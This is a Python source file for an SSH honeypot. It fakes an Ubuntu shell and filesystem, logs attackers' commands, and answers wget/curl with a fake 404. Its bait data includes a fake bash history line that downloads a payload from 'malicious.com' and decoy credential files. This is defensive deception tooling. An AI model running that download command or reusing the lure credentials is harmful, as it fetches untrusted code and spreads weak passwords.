"""
SSH Honeypot Implementation
Simulates an SSH server to capture authentication attempts and commands
"""

import asyncio
import logging
import socket
from datetime import datetime
from typing import Dict, Any

import asyncssh
from asyncssh import SSHServerSession, SSHServerProcess

from ..core.base_honeypot import BaseHoneypot
from ..utils.event_logger import EventLogger

class SSHHoneypotSession(SSHServerSession):
    """Custom SSH session handler for the honeypot"""
    
    def __init__(self, honeypot):
        self.honeypot = honeypot
        self.logger = logging.getLogger(__name__)
        self.session_id = None
        self.client_info = {}
        
    def connection_made(self, process: SSHServerProcess):
        """Called when SSH connection is established"""
        self.process = process
        self.session_id = f"ssh_{datetime.now().strftime('%Y%m%d_%H%M%S')}_{id(self)}"
        
        # Get client information
        peername = process.get_extra_info('peername')
        if peername:
            self.client_info = {
                'ip': peername[0],
                'port': peername[1],
                'session_id': self.session_id
            }
            
        self.logger.info(f"SSH connection from {self.client_info.get('ip', 'unknown')}")
        
    def shell_requested(self):
        """Handle shell request"""
        return SSHHoneypotProcess(self.honeypot, self.client_info)
        
    def exec_requested(self, command):
        """Handle command execution request"""
        self.honeypot.log_event({
            'type': 'ssh_exec',
            'command': command,
            'client_info': self.client_info,
            'timestamp': datetime.utcnow().isoformat()
        })
        
        # Return fake command output
        return SSHHoneypotProcess(self.honeypot, self.client_info, command)

class SSHHoneypotProcess(SSHServerProcess):
    """SSH process handler for command execution"""
    
    def __init__(self, honeypot, client_info, command=None):
        self.honeypot = honeypot
        self.client_info = client_info
        self.command = command
        self.logger = logging.getLogger(__name__)
        
    def connection_made(self, transport):
        super().connection_made(transport)
        
        if self.command:
            # Execute single command
            output = self.honeypot.execute_command(self.command, self.client_info)
            self.stdout.write(output)
            self.exit(0)
        else:
            # Interactive shell
            self.stdout.write(b"Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-91-generic x86_64)\n")
            self.stdout.write(b"user@honeypot:~$ ")
            
    def data_received(self, data, datatype):
        """Handle incoming data from client"""
        try:
            command = data.decode('utf-8').strip()
            
            if command.lower() in ['exit', 'logout', 'quit']:
                self.stdout.write(b"logout\n")
                self.exit(0)
                return
                
            # Log and execute command
            output = self.honeypot.execute_command(command, self.client_info)
            self.stdout.write(output)
            self.stdout.write(b"user@honeypot:~$ ")
            
        except Exception as e:
            self.logger.error(f"Error processing SSH data: {e}")

class SSHHoneypot(BaseHoneypot):
    """SSH Honeypot implementation"""
    
    def __init__(self, config: Dict[str, Any]):
        super().__init__("ssh", config)
        self.port = config.get('port', 2222)
        self.server = None
        self.fake_filesystem = self._create_fake_filesystem()
        self.current_directory = "/home/user"
        
    def _create_fake_filesystem(self) -> Dict[str, Any]:
        """Create a fake filesystem structure"""
        return {
            "/": {"type": "dir", "contents": ["home", "etc", "var", "usr", "tmp"]},
            "/home": {"type": "dir", "contents": ["user"]},
            "/home/user": {"type": "dir", "contents": ["documents", "downloads", ".ssh", ".bash_history"]},
            "/home/user/documents": {"type": "dir", "contents": ["important.txt", "passwords.txt"]},
            "/home/user/.ssh": {"type": "dir", "contents": ["authorized_keys", "id_rsa", "id_rsa.pub"]},
            "/etc": {"type": "dir", "contents": ["passwd", "shadow", "hosts"]},
            "/var": {"type": "dir", "contents": ["log", "www"]},
            "/var/log": {"type": "dir", "contents": ["auth.log", "syslog"]},
        }
    
    def execute_command(self, command: str, client_info: Dict) -> bytes:
        """Execute command and return fake output"""
        self.log_event({
            'type': 'ssh_command',
            'command': command,
            'client_info': client_info,
            'directory': self.current_directory,
            'timestamp': datetime.utcnow().isoformat()
        })
        
        # Parse command
        parts = command.split()
        if not parts:
            return b""
            
        cmd = parts[0].lower()
        
        # Handle common commands
        if cmd == "ls":
            return self._handle_ls(parts[1:])
        elif cmd == "pwd":
            return f"{self.current_directory}\n".encode()
        elif cmd == "cd":
            return self._handle_cd(parts[1:])
        elif cmd == "cat":
            return self._handle_cat(parts[1:])
        elif cmd == "whoami":
            return b"user\n"
        elif cmd == "id":
            return b"uid=1000(user) gid=1000(user) groups=1000(user)\n"
        elif cmd == "uname":
            return b"Linux honeypot 5.4.0-91-generic #102-Ubuntu SMP x86_64 GNU/Linux\n"
        elif cmd == "ps":
            return self._handle_ps()
        elif cmd == "netstat":
            return self._handle_netstat()
        elif cmd in ["wget", "curl"]:
            return self._handle_download(command)
        else:
            return f"bash: {cmd}: command not found\n".encode()
    
    def _handle_ls(self, args) -> bytes:
        """Handle ls command"""
        path = self.current_directory
        if args:
            path = args[0] if args[0].startswith('/') else f"{self.current_directory}/{args[0]}"
            
        if path in self.fake_filesystem:
            contents = self.fake_filesystem[path].get("contents", [])
            return "\n".join(contents).encode() + b"\n"
        else:
            return f"ls: cannot access '{path}': No such file or directory\n".encode()
    
    def _handle_cd(self, args) -> bytes:
        """Handle cd command"""
        if not args:
            self.current_directory = "/home/user"
            return b""
            
        new_path = args[0]
        if not new_path.startswith('/'):
            new_path = f"{self.current_directory}/{new_path}"
            
        if new_path in self.fake_filesystem and self.fake_filesystem[new_path]["type"] == "dir":
            self.current_directory = new_path
            return b""
        else:
            return f"bash: cd: {new_path}: No such file or directory\n".encode()
    
    def _handle_cat(self, args) -> bytes:
        """Handle cat command"""
        if not args:
            return b"cat: missing file operand\n"
            
        filename = args[0]
        
        # Return fake file contents
        fake_contents = {
            "important.txt": "This is a very important document.\nDo not share with anyone!",
            "passwords.txt": "admin:password123\nroot:toor\nuser:123456",
            ".bash_history": "ls\ncd documents\ncat passwords.txt\nwget http://malicious.com/payload.sh",
            "authorized_keys": "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQ... user@honeypot"
        }
        
        if filename in fake_contents:
            return fake_contents[filename].encode() + b"\n"
        else:
            return f"cat: {filename}: No such file or directory\n".encode()
    
    def _handle_ps(self) -> bytes:
        """Handle ps command"""
        return b"""  PID TTY          TIME CMD
 1234 pts/0    00:00:00 bash
 5678 pts/0    00:00:00 sshd
 9012 pts/0    00:00:00 ps
"""
    
    def _handle_netstat(self) -> bytes:
        """Handle netstat command"""
        return b"""Active Internet connections (w/o servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State
tcp        0      0 192.168.1.100:22        192.168.1.1:54321       ESTABLISHED
tcp        0      0 192.168.1.100:80        192.168.1.50:45678      TIME_WAIT
"""
    
    def _handle_download(self, command: str) -> bytes:
        """Handle wget/curl commands"""
        self.log_event({
            'type': 'ssh_download_attempt',
            'command': command,
            'timestamp': datetime.utcnow().isoformat(),
            'severity': 'high'
        })
        
        return b"--2023-01-01 12:00:00--  Connecting to server...\nHTTP request sent, awaiting response... 404 Not Found\n"
    
    async def start(self):
        """Start the SSH honeypot"""
        try:
            self.server = await asyncssh.create_server(
                lambda: SSHHoneypotSession(self),
                host='0.0.0.0',
                port=self.port,
                server_host_keys=['ssh_host_key'],
                password_auth=True,
                public_key_auth=False
            )
            
            self.logger.info(f"SSH honeypot started on port {self.port}")
            self.is_running = True
            
        except Exception as e:
            self.logger.error(f"Failed to start SSH honeypot: {e}")
            raise
    
    async def stop(self):
        """Stop the SSH honeypot"""
        if self.server:
            self.server.close()
            await self.server.wait_closed()
            self.is_running = False
            self.logger.info("SSH honeypot stopped")